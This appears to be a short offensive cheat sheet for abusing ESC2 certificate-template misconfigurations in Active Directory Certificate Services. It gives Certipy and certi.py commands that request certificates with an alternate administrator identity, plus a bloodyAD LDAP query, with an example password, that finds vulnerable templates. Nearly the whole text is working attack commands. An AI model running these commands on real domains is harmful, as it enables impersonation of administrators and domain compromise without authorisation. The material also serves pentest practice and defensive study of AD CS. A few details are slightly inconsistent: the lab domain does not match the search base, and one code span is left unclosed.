# General Overview: 

In order to abuse ESC2 certificate templates, the requirements are similar to those in ESC1, but with one key difference: if the template specifies the EKU as "Any Purpose" or doesn't specify an EKU at all, the certificate becomes versatile and can be used for any purpose. 

# Abusing ESC2 Certificates

## Certipy:
- `certipy-ad req -u "afsimmons@megacorpone.com" -p "$PASSWORD" -dc-ip "$DC_IP" -target "$ADCS_HOST" -ca 'ca_name' -template 'vulnerable template' -alt 'xadmin@megacorpone.com'
## Certi
- `python certi.py 'megacorpone.com/afsimmons@dc01.megacorpone.com' megacorpone-DC01-CA -k -n --alt-name 'xadmin@megacorpone.com' --template vulnerable-ec2-template`
## BloodyAD

- Source: https://github.com/CravateRouge/bloodyAD
- python bloodyAD.py -u alfred.simmons -p 'SuperSpawn123!' --host 172.21.100.1 -d bloody.lab get search --base 'CN=Configuration,DC=megacorpone,DC=com' --filter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))'